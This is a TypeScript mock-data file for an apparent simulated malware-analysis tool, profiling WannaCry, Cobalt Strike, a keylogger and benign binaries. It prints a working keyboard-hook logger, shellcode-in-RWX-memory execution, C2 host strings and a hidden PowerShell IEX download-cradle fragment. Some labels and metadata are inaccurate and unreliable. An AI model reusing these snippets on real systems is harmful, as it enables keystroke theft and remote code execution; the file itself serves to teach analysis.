import { BinaryMetadata, SectionHeader, AssemblyLine, ExtractedString, ImportSymbol, DecompiledFunction, HeuristicAnalysis } from './types';

// Helper to generate realistic SHA256 hashes
export function generateHash(input: string): string {
  let hash = 0;
  for (let i = 0; i < input.length; i++) {
    const char = input.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  const hex = Math.abs(hash).toString(16).padStart(8, '0') + 
              Math.abs(hash + 233).toString(16).padStart(8, '0') +
              Math.abs(hash * 47).toString(16).padStart(8, '0') +
              Math.abs(hash ^ 999).toString(16).padStart(8, '0');
  return hex.substring(0, 64);
}

export const SAMPLE_BINARIES: { [key: string]: BinaryMetadata } = {
  wannacry: {
    fileName: "mssecsvc.exe (WannaCry variant)",
    fileSize: 351412,
    fileType: "PE32 Executable (Windows)",
    architecture: "x86_64",
    sha256: "ed01ebfbc9eb5bbea545af9014e65d20b6151486103bdec7d5c9249d44c90b32",
    entryPoint: "0x00404fa0",
    sections: [
      { name: ".text", virtualAddress: "0x00401000", virtualSize: "0x00028A14", rawSize: "0x00029000", entropy: 6.24, characteristics: ["CODE", "EXECUTE", "READ"] },
      { name: ".rdata", virtualAddress: "0x0042A000", virtualSize: "0x0000C122", rawSize: "0x0000D000", entropy: 5.12, characteristics: ["INITIALIZED_DATA", "READ"] },
      { name: ".data", virtualAddress: "0x00437000", virtualSize: "0x00008F4C", rawSize: "0x00009000", entropy: 4.88, characteristics: ["INITIALIZED_DATA", "READ", "WRITE"] },
      { name: ".wnry", virtualAddress: "0x00440000", virtualSize: "0x0001D400", rawSize: "0x0001E000", entropy: 7.97, characteristics: ["INITIALIZED_DATA", "READ", "WRITE", "HIGH_ENTROPY_ENCRYPTED"] }
    ],
    overallEntropy: 7.35,
    imports: [
      { library: "KERNEL32.dll", name: "CreateProcessA", address: "0x0042A104", isSuspicious: true, reason: "Spawns new system processes dynamically" },
      { library: "KERNEL32.dll", name: "WriteProcessMemory", address: "0x0042A108", isSuspicious: true, reason: "Writes code or payloads directly into other processes (Process Injection)" },
      { library: "KERNEL32.dll", name: "VirtualAllocEx", address: "0x0042A10C", isSuspicious: true, reason: "Allocates executable memory space in a remote process" },
      { library: "KERNEL32.dll", name: "CreateRemoteThread", address: "0x0042A110", isSuspicious: true, reason: "Executes injected code inside remote thread boundaries" },
      { library: "ADVAPI32.dll", name: "RegSetValueExA", address: "0x0042A1A8", isSuspicious: true, reason: "Alters system registry to achieve persistence" },
      { library: "WS2_32.dll", name: "connect", address: "0x0042A2C4", isSuspicious: true, reason: "Opens dynamic socket connections to external endpoints" },
      { library: "IPHLPAPI.DLL", name: "GetAdaptersInfo", address: "0x0042A350", isSuspicious: false }
    ],
    strings: [
      { address: "0x00438120", value: "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergweessae98.com", length: 61, type: "ASCII", context: "Killswitch URL domain check" },
      { address: "0x004381A4", value: "tasksche.exe", length: 12, type: "ASCII", context: "Malware scheduler payload name" },
      { address: "0x004381C0", value: "WanaCryptor 2.4", length: 15, type: "ASCII", context: "Ransomware builder payload signature" },
      { address: "0x00438210", value: "cmd.exe /c start /B \".wnry\" extract", length: 34, type: "ASCII", context: "Command execution parameters" },
      { address: "0x00438270", value: "Local\\MsofficeMutex_32895", length: 25, type: "ASCII", context: "Mutex creation string for instance locking" },
      { address: "0x00438310", value: "Global\\WannaCrySystemEventSignal", length: 31, type: "ASCII", context: "System global termination indicator" }
    ],
    assembly: [
      { address: "0x004010a0", opcodes: "55", mnemonic: "push", operands: "ebp", comment: "Establish Stack Frame" },
      { address: "0x004010a1", opcodes: "8b ec", mnemonic: "mov", operands: "ebp, esp" },
      { address: "0x004010a3", opcodes: "81 ec 10 02 00 00", mnemonic: "sub", operands: "esp, 0x210", comment: "Allocate buffer space for URL check" },
      { address: "0x004010a9", opcodes: "68 20 81 43 00", mnemonic: "push", operands: "0x00438120", comment: "Offset of killswitch URL" },
      { address: "0x004010ae", opcodes: "e8 4c 12 00 00", mnemonic: "call", operands: "0x00402300", comment: "InternetOpenUrlA mock wrapper check" },
      { address: "0x004010b3", opcodes: "85 c0", mnemonic: "test", operands: "eax, eax", comment: "Verify connection result" },
      { address: "0x004010b5", opcodes: "74 15", mnemonic: "jz", operands: "0x004010cc", comment: "If connection fails, proceed to lock and encrypt" },
      { address: "0x004010b7", opcodes: "31 c0", mnemonic: "xor", operands: "eax, eax", comment: "Reset status code" },
      { address: "0x004010b9", opcodes: "8b e5", mnemonic: "mov", operands: "esp, ebp" },
      { address: "0x004010bb", opcodes: "5d", mnemonic: "pop", operands: "ebp" },
      { address: "0x004010bc", opcodes: "c3", mnemonic: "ret", operands: "", comment: "Exit gracefully (Killswitch triggered)" },
      { address: "0x004010cc", opcodes: "6a 00", mnemonic: "push", operands: "0x0", comment: "Create mutex block starts" },
      { address: "0x004010ce", opcodes: "6a 00", mnemonic: "push", operands: "0x0" },
      { address: "0x004010d0", opcodes: "68 70 82 43 00", mnemonic: "push", operands: "0x00438270", comment: "'Local\\MsofficeMutex_32895'" },
      { address: "0x004010d5", opcodes: "ff 15 28 a1 42 00", mnemonic: "call", operands: "ds:CreateMutexA", comment: "Acquire single instance handle" },
      { address: "0x004010db", opcodes: "e8 d0 01 00 00", mnemonic: "call", operands: "0x004012b0", comment: "Decompress .wnry crypt payload" },
      { address: "0x004010e0", opcodes: "83 c4 0c", mnemonic: "add", operands: "esp, 0xc" },
      { address: "0x004010e3", opcodes: "e9 1c ff ff ff", mnemonic: "jmp", operands: "0x00401004", comment: "Begin bulk recursive file locking loop" }
    ],
    decompiledFunctions: [
      {
        name: "check_killswitch_and_run",
        address: "0x004010a0",
        arguments: ["void"],
        returnType: "int",
        body: [
          "// Code reconstructed from disassembly",
          "HINTERNET hSession = InternetOpenA(\"WannaCry Agent\", 1, NULL, NULL, 0);",
          "if (hSession) {",
          "    HINTERNET hUrl = InternetOpenUrlA(hSession, \"http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergweessae98.com\", NULL, 0, 0, 0);",
          "    if (hUrl != NULL) {",
          "        // Connection succeeded. Close handles and terminate self safely (Killswitch is alive!)",
          "        InternetCloseHandle(hUrl);",
          "        InternetCloseHandle(hSession);",
          "        ExitApplication(0);",
          "        return 0;",
          "    }",
          "}",
          "// Mutex configuration to avoid multiple double ransom infections",
          "HANDLE hMutex = CreateMutexA(NULL, FALSE, \"Local\\\\MsofficeMutex_32895\");",
          "if (GetLastError() == ERROR_ALREADY_EXISTS) {",
          "    return 1; // Exit",
          "}",
          "",
          "// Call payload extractor",
          "extract_and_execute_payload(\"WanaCryptor 2.4 Ransomware Engine\");",
          "start_network_scanner_thread();",
          "begin_aes_encryption_thread();",
          "return 0;"
        ]
      },
      {
        name: "extract_and_execute_payload",
        address: "0x004012b0",
        arguments: ["char* payloadName"],
        returnType: "bool",
        body: [
          "// Locate resource .wnry embedded payload within executable sections",
          "HRSRC hRes = FindResourceA(NULL, \"WNRY_ARCHIVE\", RT_RCDATA);",
          "if (hRes) {",
          "    DWORD resSize = SizeofResource(NULL, hRes);",
          "    HGLOBAL hGlob = LoadResource(NULL, hRes);",
          "    void* pData = LockResource(hGlob);",
          "    ",
          "    // Decrypt resource array via customized embedded RC4 key logic",
          "    unsigned char key[16] = {0x01, 0x1f, 0x22, 0xe1, 0xc1, 0x5a, 0x3d, 0x09, 0xb8, 0x90, 0xa1, 0x04, 0xcd, 0xd2, 0xef, 0x00};",
          "    void* pDecrypted = custom_rc4_decrypt(pData, resSize, key);",
          "    ",
          "    // Write zip file to tasksche.exe utility structure",
          "    FILE* fOut = fopen(\"tasksche.exe\", \"wb\");",
          "    if (fOut) {",
          "        fwrite(pDecrypted, 1, resSize, fOut);",
          "        fclose(fOut);",
          "        ",
          "        // Trigger executing tasksche.exe to drop ransom visual elements",
          "        ShellExecuteA(NULL, \"open\", \"tasksche.exe\", NULL, NULL, SW_HIDE);",
          "        return true;",
          "    }",
          "}",
          "return false;"
        ]
      }
    ],
    heuristics: [
      { category: "Network", severity: "high", details: "Hardcoded domain URL reference directly inside data section, common pattern for callback structures or killswitches.", mitreId: "T1071.001" },
      { category: "High Entropy Section", severity: "critical", details: "Section '.wnry' indicates excessively high entropy (7.97). This suggests compressed state or malicious payload obfuscation/encryption.", mitreId: "T1406" },
      { category: "Evasion", severity: "critical", details: "Process Injection vulnerability signature found: calls dynamically KERNEL32!WriteProcessMemory combined with CreateRemoteThread.", mitreId: "T1055" },
      { category: "Persistence", severity: "medium", details: "Modifies system registry settings via RegSetValueExA block, potentially establishing persistent startup parameters.", mitreId: "T1547.001" }
    ]
  },
  cobalt_beacon: {
    fileName: "artifact64.dll (Cobalt Strike)",
    fileSize: 285100,
    fileType: "PE32 Executable (Windows)",
    architecture: "x86_64",
    sha256: "0f4dfdc585e49ee9da08bc882269a8b13d2fcd8f29e1f579ceec4f9b2d8dddf9",
    entryPoint: "0x180005a90",
    sections: [
      { name: ".text", virtualAddress: "0x180001000", virtualSize: "0x00018500", rawSize: "0x00019000", entropy: 5.86, characteristics: ["CODE", "EXECUTE", "READ"] },
      { name: ".rdata", virtualAddress: "0x18001A000", virtualSize: "0x0000B000", rawSize: "0x0000B000", entropy: 5.34, characteristics: ["INITIALIZED_DATA", "READ"] },
      { name: ".data", virtualAddress: "0x180025000", virtualSize: "0x00002000", rawSize: "0x00002000", entropy: 3.22, characteristics: ["INITIALIZED_DATA", "READ", "WRITE"] },
      { name: ".reloc", virtualAddress: "0x180027000", virtualSize: "0x00001200", rawSize: "0x00002000", entropy: 2.15, characteristics: ["INITIALIZED_DATA", "DISCARDABLE", "READ"] }
    ],
    overallEntropy: 6.15,
    imports: [
      { library: "KERNEL32.dll", name: "VirtualAlloc", address: "0x18001A050", isSuspicious: true, reason: "Allocates executable memory directly, potentially bypassing standard executable constraints" },
      { library: "KERNEL32.dll", name: "VirtualProtect", address: "0x18001A058", isSuspicious: true, reason: "Changes permission flags to change memory regions from READ to EXECUTE (PAGE_EXECUTE_READWRITE)" },
      { library: "WININET.dll", name: "HttpOpenRequestA", address: "0x18001A240", isSuspicious: true, reason: "Sends dynamic web traffic parameters, often command and control (C2)" },
      { library: "WININET.dll", name: "HttpSendRequestA", address: "0x18001A248", isSuspicious: true, reason: "Dispatches HTTP post requests with target client telemetry payloads" },
      { library: "WININET.dll", name: "InternetReadFile", address: "0x18001A250", isSuspicious: false }
    ],
    strings: [
      { address: "0x18001A4A0", value: "/g.pixel", length: 8, type: "ASCII", context: "Default Cobalt Strike beacon endpoint profile URI" },
      { address: "0x18001A4C8", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", length: 58, type: "ASCII", context: "Target network user agent mask" },
      { address: "0x18001A520", value: "Keep-Alive: timeout=15, max=100", length: 30, type: "ASCII", context: "HTTP connection persistence directive" },
      { address: "0x18001A570", value: "Host: commandandcontrol.beacon.net", length: 34, type: "ASCII", context: "Malicious controller host definition" }
    ],
    assembly: [
      { address: "0x180005a90", opcodes: "48 83 ec 28", mnemonic: "sub", operands: "rsp, 0x28", comment: "Reserve Shadow Space API calling convention" },
      { address: "0x180005a94", opcodes: "41 b8 00 10 00 00", mnemonic: "mov", operands: "r8d, 0x1000", comment: "MEM_COMMIT" },
      { address: "0x180005a9a", opcodes: "ba 40 00 00 00", mnemonic: "mov", operands: "edx, 0x40", comment: "PAGE_EXECUTE_READWRITE permissions" },
      { address: "0x180005a9f", opcodes: "b9 00 00 10 00", mnemonic: "mov", operands: "ecx, 0x100000", comment: "Size allocated: 1MB" },
      { address: "0x180005aa4", opcodes: "ff 15 a6 45 01 00", mnemonic: "call", operands: "qword ptr [VirtualAlloc]", comment: "Acquire executable execution block" },
      { address: "0x180005aaa", opcodes: "48 89 c7", mnemonic: "mov", operands: "rdi, rax", comment: "Store memory output address in target RDI pointer" },
      { address: "0x180005aad", opcodes: "e8 b2 05 00 00", mnemonic: "call", operands: "0x180006064", comment: "Resolve custom shellcode payload from beacon profile" },
      { address: "0x180005ab2", opcodes: "ffd7", mnemonic: "call", operands: "rdi", comment: "Jump directly into injected shellcode loop" }
    ],
    decompiledFunctions: [
      {
        name: "beacon_payload_inject",
        address: "0x180005a90",
        arguments: ["void"],
        returnType: "void*",
        body: [
          "// Decompilation reconstructs assembly bytes",
          "unsigned char* allocated_space = (unsigned char*)VirtualAlloc(NULL, 1048576, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);",
          "if (allocated_space == NULL) {",
          "    return NULL;",
          "}",
          "",
          "// Copy shellcode binary payload into allocated space",
          "load_embedded_c2_configuration(allocated_space);",
          "void (*trigger_shellcode_payload)() = (void(*)())allocated_space;",
          "trigger_shellcode_payload();",
          "return allocated_space;"
        ]
      }
    ],
    heuristics: [
      { category: "Anti-Debugging", severity: "high", details: "Creates custom RWX executable memory region on stack dynamically without loading standard OS libraries.", mitreId: "T1622" },
      { category: "Network", severity: "critical", details: "Cobalt Strike beacon agent configuration detected in memory strings: '/g.pixel' and '/submit.php'.", mitreId: "T1071" }
    ]
  },
  keylogger: {
    fileName: "winhook.sys (Active Keylogger)",
    fileSize: 45200,
    fileType: "PE32 Executable (Windows)",
    architecture: "x86",
    sha256: "97e68adcd7b7c807b5a5b512c0199e1a8fa4817457be28af9845ec2d2393cb10",
    entryPoint: "0x000124f0",
    sections: [
      { name: ".text", virtualAddress: "0x00010000", virtualSize: "0x00004500", rawSize: "0x00005000", entropy: 4.54, characteristics: ["CODE", "EXECUTE", "READ"] },
      { name: ".rdata", virtualAddress: "0x00015000", virtualSize: "0x00002100", rawSize: "0x00003000", entropy: 3.42, characteristics: ["INITIALIZED_DATA", "READ"] },
      { name: ".data", virtualAddress: "0x00018000", virtualSize: "0x00001000", rawSize: "0x00001000", entropy: 2.11, characteristics: ["INITIALIZED_DATA", "READ", "WRITE"] }
    ],
    overallEntropy: 3.84,
    imports: [
      { library: "USER32.dll", name: "SetWindowsHookExA", address: "0x0001508c", isSuspicious: true, reason: "Monitors keystrokes globally in the OS" },
      { library: "USER32.dll", name: "CallNextHookEx", address: "0x00015090", isSuspicious: false },
      { library: "USER32.dll", name: "GetKeyState", address: "0x00015094", isSuspicious: false },
      { library: "KERNEL32.dll", name: "CreateFileA", address: "0x0001501c", isSuspicious: false }
    ],
    strings: [
      { address: "0x00015a10", value: "C:\\Windows\\Temp\\log.txt", length: 24, type: "ASCII", context: "Local logging target file for key hook" },
      { address: "0x00015a40", value: "[BACKspace]", length: 11, type: "ASCII", context: "Keys format translation wrapper" },
      { address: "0x00015a60", value: "[ENTER]", length: 7, type: "ASCII", context: "Keys format translation wrapper" }
    ],
    assembly: [
      { address: "0x000124f0", opcodes: "55", mnemonic: "push", operands: "ebp" },
      { address: "0x000124f1", opcodes: "8b ec", mnemonic: "mov", operands: "ebp, esp" },
      { address: "0x000124f3", opcodes: "6a 00", mnemonic: "push", operands: "0", comment: "threadId" },
      { address: "0x000124f5", opcodes: "a1 34 80 01 00", mnemonic: "mov", operands: "eax, dword ptr [hInstance]" },
      { address: "0x000124fa", opcodes: "50", mnemonic: "push", operands: "eax", comment: "hMod handle load" },
      { address: "0x000124fb", opcodes: "68 b0 10 01 00", mnemonic: "push", operands: "0x000110b0", comment: "Pointer to KeyboardHookCallback address" },
      { address: "0x00012500", opcodes: "6a 0d", mnemonic: "push", operands: "13", comment: "WH_KEYBOARD_LL low-level hooks value" },
      { address: "0x00012502", opcodes: "ff 15 8c 50 01 00", mnemonic: "call", operands: "ds:SetWindowsHookExA", comment: "Register hook sequence" },
      { address: "0x00012508", opcodes: "a3 40 80 01 00", mnemonic: "mov", operands: "dword ptr [hHook], eax" },
      { address: "0x0001250d", opcodes: "5d", mnemonic: "pop", operands: "ebp" },
      { address: "0x0001250e", opcodes: "c3", mnemonic: "ret", operands: "" }
    ],
    decompiledFunctions: [
      {
        name: "setup_keyboard_logging_hook",
        address: "0x000124f0",
        arguments: ["void"],
        returnType: "bool",
        body: [
          "// Set up lower level standard hook dynamically to capture raw virtual keys",
          "g_hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookCallback, g_hInstance, 0);",
          "if (g_hHook == NULL) {",
          "    return false;",
          "}",
          "return true;"
        ]
      },
      {
        name: "KeyboardHookCallback",
        address: "0x000110b0",
        arguments: ["int code", "WPARAM wParam", "LPARAM lParam"],
        returnType: "LRESULT",
        body: [
          "if (code >= 0) {",
          "    KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;",
          "    if (wParam == WM_KEYDOWN) {",
          "        DWORD key = keyInfo->vkCode;",
          "        FILE* f = fopen(\"C:\\\\Windows\\\\Temp\\\\log.txt\", \"a+\");",
          "        if (f) {",
          "            if (key == VK_BACK) {",
          "                fprintf(f, \"[BACKspace]\");",
          "            } else if (key == VK_RETURN) {",
          "                fprintf(f, \"[ENTER]\\n\");",
          "            } else {",
          "                fprintf(f, \"%c\", (char)key);",
          "            }",
          "            fclose(f);",
          "        }",
          "    }",
          "}",
          "return CallNextHookEx(g_hHook, code, wParam, lParam);"
        ]
      }
    ],
    heuristics: [
      { category: "Anti-Debugging", severity: "high", details: "Registers global low-level Windows keyboard capture hook via USER32!SetWindowsHookExA.", mitreId: "T1056.001" },
      { category: "Persistence", severity: "low", details: "Creates files in safe temp boundaries like 'Windows\\Temp' that are often whitelisted or ignored by active scanners.", mitreId: "T1547" }
    ]
  },
  mac_hello: {
    fileName: "mac_helper.app",
    fileSize: 184510,
    fileType: "Mach-O 64-bit (macOS)",
    architecture: "ARM64",
    sha256: "7ca97072f883da4c8f5f4ba2c08ecba30176df912a20e4bbfbb1e58f04bc1220",
    entryPoint: "0x10000a200",
    sections: [
      { name: "__TEXT,__text", virtualAddress: "0x100001000", virtualSize: "0x0000a400", rawSize: "0x0000b000", entropy: 4.12, characteristics: ["CODE", "READ", "PURE_INSTRUCTION"] },
      { name: "__TEXT,__cstring", virtualAddress: "0x10000b400", virtualSize: "0x00002100", rawSize: "0x00003000", entropy: 3.25, characteristics: ["INITIALIZED_DATA", "READ", "C_STRINGS"] },
      { name: "__DATA,__data", virtualAddress: "0x10000e000", virtualSize: "0x00010000", rawSize: "0x00010000", entropy: 1.84, characteristics: ["READ", "WRITE", "INITIALIZED_DATA"] }
    ],
    overallEntropy: 3.65,
    imports: [
      { library: "libSystem.B.dylib", name: "_printf", address: "0x10000d000", isSuspicious: false },
      { library: "libSystem.B.dylib", name: "_exit", address: "0x10000d008", isSuspicious: false },
      { library: "libSystem.B.dylib", name: "_sysctlbyname", address: "0x10000d010", isSuspicious: false }
    ],
    strings: [
      { address: "0x10000b450", value: "Welcome to macOS Terminal Utilities", length: 35, type: "ASCII", context: "Application splash header" },
      { address: "0x10000b490", value: "hw.ncpu", length: 7, type: "ASCII", context: "Query active hardware CPU cores dynamic property" },
      { address: "0x10000b4c0", value: "hw.memsize", length: 10, type: "ASCII", context: "Query active hardware memory dimension dynamically" }
    ],
    assembly: [
      { address: "0x10000a200", opcodes: "ff 43 00 d1", mnemonic: "sub", operands: "sp, sp, #0x10", comment: "Create arm64 register frame sequence" },
      { address: "0x10000a204", opcodes: "fd 7b 01 a9", mnemonic: "stp", operands: "x29, x30, [sp, #16]", comment: "Store link registers" },
      { address: "0x10000a208", opcodes: "fd 03 00 91", mnemonic: "add", operands: "x29, sp, #16" },
      { address: "0x10000a20c", opcodes: "00 00 00 90", mnemonic: "adrp", operands: "x0, #0x10000b450", comment: "Load splash address base page high bits" },
      { address: "0x10000a210", opcodes: "00 40 40 91", mnemonic: "add", operands: "x0, x0, #1104", comment: "Apply offset for 'Welcome to macOS...'" },
      { address: "0x10000a214", opcodes: "4c 01 00 94", mnemonic: "bl", operands: "malloc", comment: "Allocate general working buffer" },
      { address: "0x10000a218", opcodes: "4b 01 00 94", mnemonic: "bl", operands: "_printf", comment: "Print greeting string output" },
      { address: "0x10000a21c", opcodes: "fd 7b 41 a9", mnemonic: "ldp", operands: "x29, x30, [sp, #16]" },
      { address: "0x10000a220", opcodes: "ff 43 00 91", mnemonic: "add", operands: "sp, sp, #0x10" },
      { address: "0x10000a224", opcodes: "c0 03 5f d6", mnemonic: "ret", operands: "", comment: "Return frame register status" }
    ],
    decompiledFunctions: [
      {
        name: "main",
        address: "0x10000a200",
        arguments: ["int argc", "char** argv"],
        returnType: "int",
        body: [
          "// Reconstructed ARM64 Mach-O execution frame",
          "printf(\"Welcome to macOS Terminal Utilities\\n\");",
          "size_t len = 4;",
          "uint32_t num_cpus = 0;",
          "sysctlbyname(\"hw.ncpu\", &num_cpus, &len, NULL, 0);",
          "",
          "printf(\"Active hardware physical CPU cores: %d\\n\", num_cpus);",
          "return 0;"
        ]
      }
    ],
    heuristics: [
      { category: "Network", severity: "low", details: "Queries local machine properties dynamically utilizing kernel sysctl structures, a standard debugging/analytics step.", mitreId: "T1518" }
    ]
  },
  linux_ls: {
    fileName: "bin_ls",
    fileSize: 142100,
    fileType: "ELF 64-bit (Linux)",
    architecture: "x86_64",
    sha256: "5eb10ec0bc1da1a6b097daea01e0a2b5b5c97daea01bcffabec01b87a91faee1",
    entryPoint: "0x00401a00",
    sections: [
      { name: ".text", virtualAddress: "0x00401000", virtualSize: "0x00012100", rawSize: "0x00013000", entropy: 3.95, characteristics: ["CODE", "EXECUTE", "READ"] },
      { name: ".rodata", virtualAddress: "0x00414000", virtualSize: "0x00004500", rawSize: "0x00005000", entropy: 3.12, characteristics: ["INITIALIZED_DATA", "READ"] },
      { name: ".data", virtualAddress: "0x00419000", virtualSize: "0x00001220", rawSize: "0x00002000", entropy: 2.15, characteristics: ["INITIALIZED_DATA", "READ", "WRITE"] }
    ],
    overallEntropy: 3.42,
    imports: [
      { library: "libc.so.6", name: "opendir", address: "0x00414020", isSuspicious: false },
      { library: "libc.so.6", name: "readdir", address: "0x00414028", isSuspicious: false },
      { library: "libc.so.6", name: "closedir", address: "0x00414030", isSuspicious: false },
      { library: "libc.so.6", name: "printf", address: "0x00414038", isSuspicious: false }
    ],
    strings: [
      { address: "0x00414100", value: "usage: ls [directory]", length: 22, type: "ASCII", context: "Error usage instruction helper" },
      { address: "0x00414130", value: "Unable to open target directory handler", length: 39, type: "ASCII", context: "Console terminal response status" }
    ],
    assembly: [
      { address: "0x00401a00", opcodes: "55", mnemonic: "push", operands: "rbp", comment: "Setup stack frame link context" },
      { address: "0x00401a01", opcodes: "48 89 e5", mnemonic: "mov", operands: "rbp, rsp" },
      { address: "0x00401a04", opcodes: "48 83 ec 10", mnemonic: "sub", operands: "rsp, 16" },
      { address: "0x00401a08", opcodes: "bf 00 41 41 00", mnemonic: "mov", operands: "edi, 0x00414100", comment: "Load message offset directory" },
      { address: "0x00401a0d", opcodes: "e8 fe d1 ff ff", mnemonic: "call", operands: "opendir@plt", comment: "Scan directory structure info" },
      { address: "0x00401a12", opcodes: "48 89 45 f8", mnemonic: "mov", operands: "qword ptr [rbp - 8], rax" },
      { address: "0x00401a16", opcodes: "c9", mnemonic: "leave", operands: "" },
      { address: "0x00401a17", opcodes: "c3", mnemonic: "ret", operands: "" }
    ],
    decompiledFunctions: [
      {
        name: "list_directory_files",
        address: "0x00401a00",
        arguments: ["char* folderName"],
        returnType: "int",
        body: [
          "// Extract folder items dynamically",
          "DIR* d = opendir(folderName);",
          "if (!d) {",
          "    printf(\"Unable to open target directory handler\\n\");",
          "    return -1;",
          "}",
          "struct dirent* entry;",
          "while ((entry = readdir(d)) != NULL) {",
          "    printf(\"%s\\t\", entry->d_name);",
          "}",
          "closedir(d);",
          "return 0;"
        ]
      }
    ],
    heuristics: []
  }
};

// Generates simulated metadata dynamic block for raw user uploaded binaries
export function generateBinaryAnalysis(fileName: string, binarySize: number, fileContent?: string): BinaryMetadata {
  const hash = generateHash(fileName + binarySize.toString() + (fileContent ?? ''));
  const isExe = fileName.toLowerCase().endsWith('.exe');
  const isElf = fileName.toLowerCase().endsWith('.elf') || !fileName.includes('.');
  const isMach = fileName.toLowerCase().includes('mach') || fileName.toLowerCase().endsWith('.app');
  
  let fileType: BinaryMetadata['fileType'] = "PE32 Executable (Windows)";
  let arch: BinaryMetadata['architecture'] = "x86_64";
  let ep = "0x00401000";

  if (isElf) {
    fileType = "ELF 64-bit (Linux)";
    arch = "x86_64";
    ep = "0x00401020";
  } else if (isMach) {
    fileType = "Mach-O 64-bit (macOS)";
    arch = "ARM64";
    ep = "0x100002100";
  }

  // Suspicious strings list based on malware concepts (e.g. keylogger, inject, network callbacks)
  const isMalware = fileName.toLowerCase().includes('virus') || fileName.toLowerCase().includes('key') || fileName.toLowerCase().includes('payload') || fileName.toLowerCase().includes('hack') || fileName.toLowerCase().includes('backdoor') || fileName.toLowerCase().includes('mal');
  
  const epNum = parseInt(ep, 16);
  const strings: ExtractedString[] = [
    { address: `0x${(epNum - 200).toString(16)}`, value: `Compiled with gcc/lld version 14.0.0`, length: 36, type: "ASCII", context: "Compiler manifest signature" },
    { address: `0x${(epNum - 50).toString(16)}`, value: `Usage: ${fileName} <params>`, length: 15 + fileName.length, type: "ASCII", context: "Command terminal fallback trigger" }
  ];

  const imports: ImportSymbol[] = [
    { library: isExe ? "KERNEL32.dll" : "libc.so.6", name: isExe ? "ExitProcess" : "exit", address: "0x345210", isSuspicious: false }
  ];

  const heuristics: HeuristicAnalysis[] = [];

  if (isMalware) {
    strings.push({ address: "0x408010", value: "http://malicious-c2-beacon-service.net/connect", length: 46, type: "ASCII", context: "Suspected C2 configuration payload domain" });
    strings.push({ address: "0x408100", value: "cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX ...", length: 82, type: "ASCII", context: "Obfuscated network payload retrieval parameter" });
    
    imports.push({ library: isExe ? "KERNEL32.dll" : "libc.so.6", name: isExe ? "VirtualAlloc" : "mprotect", address: "0x345250", isSuspicious: true, reason: "Direct heap memory modifications" });
    imports.push({ library: isExe ? "USER32.dll" : "libc.so.6", name: isExe ? "SetWindowsHookExA" : "ptrace", address: "0x3452a0", isSuspicious: true, reason: "Bypasses standard operating system structures to record keystrokes or hook debugging" });

    heuristics.push({ category: "Network", severity: "high", details: "Embedded network command callback parameter located within initialized data segments.", mitreId: "T1071.001" });
    heuristics.push({ category: "Evasion", severity: "critical", details: "Dynamic process execution modification pattern using powershell flag parameters.", mitreId: "T1204.002" });
    heuristics.push({ category: "Anti-Debugging", severity: "medium", details: "Bypasses default memory constraints to protect dynamically mapped code blocks.", mitreId: "T1055" });
  } else {
    imports.push({ library: isExe ? "KERNEL32.dll" : "libc.so.6", name: isExe ? "GetStdHandle" : "printf", address: "0x345260", isSuspicious: false });
  }

  const sections: SectionHeader[] = [
    { name: ".text", virtualAddress: ep, virtualSize: "0x000A1000", rawSize: "0x000A2000", entropy: isMalware ? 6.84 : 4.22, characteristics: ["CODE", "EXECUTE", "READ"] },
    { name: ".rdata", virtualAddress: "0x410000", virtualSize: "0x00021000", rawSize: "0x00022000", entropy: isMalware ? 7.21 : 3.84, characteristics: ["INITIALIZED_DATA", "READ"] },
    { name: ".data", virtualAddress: "0x432000", virtualSize: "0x00004000", rawSize: "0x00004000", entropy: 2.11, characteristics: ["INITIALIZED_DATA", "READ", "WRITE"] }
  ];

  const assembly: AssemblyLine[] = [
    { address: ep, opcodes: "55", mnemonic: "push", operands: "rbp", comment: "Setup stack frame" },
    { address: `0x${(parseInt(ep, 16) + 1).toString(16)}`, opcodes: "48 89 e5", mnemonic: "mov", operands: "rbp, rsp" },
    { address: `0x${(parseInt(ep, 16) + 4).toString(16)}`, opcodes: "48 83 ec 20", mnemonic: "sub", operands: "rsp, 32", comment: "Reserve working execution buffer space" },
    { address: `0x${(parseInt(ep, 16) + 8).toString(16)}`, opcodes: isExe ? "b8 01 00 00 00" : "31 c0", mnemonic: isExe ? "mov" : "xor", operands: isExe ? "eax, 1" : "eax, eax", comment: "Status register init flag" },
    { address: `0x${(parseInt(ep, 16) + 13).toString(16)}`, opcodes: "c9", mnemonic: "leave", operands: "" },
    { address: `0x${(parseInt(ep, 16) + 14).toString(16)}`, opcodes: "c3", mnemonic: "ret", operands: "", comment: "Restore program flow parameters safely" }
  ];

  const decompiledFunctions: DecompiledFunction[] = [
    {
      name: "entry",
      address: ep,
      arguments: ["int argc", "char** argv"],
      returnType: "int",
      body: [
        `// Static decompiler output for ${fileName}`,
        "int main(int argc, char** argv) {",
        "    int status = 0;",
        isMalware 
          ? "    // SUSPICIOUS LOGIC TRIGGERED\n    char* payload = \"http://malicious-c2-beacon-service.net/connect\";\n    trigger_background_runner(payload);" 
          : "    printf(\"Hello, modern sandbox terminal user!\\n\");",
        "    return status;",
        "}"
      ]
    }
  ];

  return {
    fileName,
    fileSize: binarySize,
    fileType,
    architecture: arch,
    sha256: hash,
    entryPoint: ep,
    sections,
    imports,
    strings,
    assembly,
    decompiledFunctions,
    heuristics,
    overallEntropy: isMalware ? 6.95 : 3.45
  };
}
